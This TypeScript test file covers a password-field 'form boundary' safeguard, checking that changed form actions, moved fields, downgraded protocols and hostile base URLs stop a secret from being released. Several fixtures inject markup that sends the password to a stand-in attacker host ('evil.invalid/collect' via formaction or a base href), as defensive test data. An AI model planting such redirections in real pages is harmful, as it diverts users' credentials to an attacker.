import { test, expect, afterAll } from 'bun:test';
import { Window } from 'happy-dom';
import { captureBoundary, sameBoundary, secretDestinationAllowed, fieldGroup } from './form-boundary';
const win = new Window({ url: 'https://accounts.example/login' });
afterAll(() => win.happyDOM.abort());
function fixture() {
  win.document.body.innerHTML = '<form id="a" action="/session"><input id="p" type="password" name="password" maxlength="128"></form><form id="b"></form>';
  return win.document.getElementById('p') as unknown as HTMLElement;
}
test('boundary detects a moved field, changed form action and changed length', () => {
  const p = fixture(), boundary = captureBoundary(p);
  expect(sameBoundary(p,boundary)).toBe(true);
  p.setAttribute('maxlength','12'); expect(sameBoundary(p,boundary)).toBe(false);
  p.setAttribute('maxlength','128'); expect(sameBoundary(p,boundary)).toBe(true);
  win.document.getElementById('a')!.setAttribute('action','/different'); expect(sameBoundary(p,boundary)).toBe(false);
  win.document.getElementById('a')!.setAttribute('action','/session');
  win.document.getElementById('b')!.append(p as any); expect(sameBoundary(p,boundary)).toBe(false);
});
test('secret delivery checks every submit override including external associated buttons', () => {
  const p = fixture(); expect(secretDestinationAllowed(p,'https://accounts.example')).toBe(true);
  const boundary = captureBoundary(p);
  win.document.body.insertAdjacentHTML('beforeend','<button form="a" formaction="https://evil.invalid/collect">Submit</button>');
  expect(sameBoundary(p,boundary)).toBe(false);
  expect(secretDestinationAllowed(p,'https://accounts.example')).toBe(false);
});
test('relative actions follow base URI and reject credentials and protocol downgrades', () => {
  const p = fixture();
  for (const action of ['http://accounts.example/session','https://user:pw@accounts.example/session','https://evil.invalid/session']) {
    win.document.getElementById('a')!.setAttribute('action',action);
    expect(secretDestinationAllowed(p,'https://accounts.example')).toBe(false);
  }
  win.document.getElementById('a')!.setAttribute('action','session');
  win.document.head.innerHTML = '<base href="https://evil.invalid/">';
  expect(secretDestinationAllowed(p,'https://accounts.example')).toBe(false);
  win.document.head.replaceChildren();
});
test('boundary does not depend on field values and distinguishes form-less sections', () => {
  const p = fixture(), boundary = captureBoundary(p);
  (p as HTMLInputElement).value = 'Synthetic-only'; expect(sameBoundary(p,boundary)).toBe(true);
  win.document.body.innerHTML = '<section><input id="first"></section><section><input id="second"></section>';
  expect(fieldGroup(win.document.getElementById('first') as any)).not.toBe(fieldGroup(win.document.getElementById('second') as any));
});
